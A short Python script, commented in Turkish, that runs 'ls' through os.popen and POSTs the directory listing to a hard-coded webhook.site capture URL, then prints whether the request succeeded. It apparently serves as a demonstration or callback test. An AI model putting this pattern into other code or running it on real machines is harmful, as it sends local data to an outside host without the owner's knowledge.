import os
import requests

def send_ls_output():
    # Komutu çalıştır ve sonucu al
    output = os.popen("ls").read()

    # Webhook URL'sine gönder
    webhook_url = "https://webhook.site/7ad34d89-17ce-431b-8f23-ab528bd2b223"  # Webhook URL'nizi buraya yazın
    payload = {"output": output}
    
    # Webhook'a POST isteği gönder
    response = requests.post(webhook_url, data=payload)

    # Yanıtı kontrol et
    if response.status_code == 200:
        print("Webhook gönderildi başarıyla!")
    else:
        print(f"Webhook gönderme hatası: {response.status_code}")

if __name__ == "__main__":
    send_ls_output()
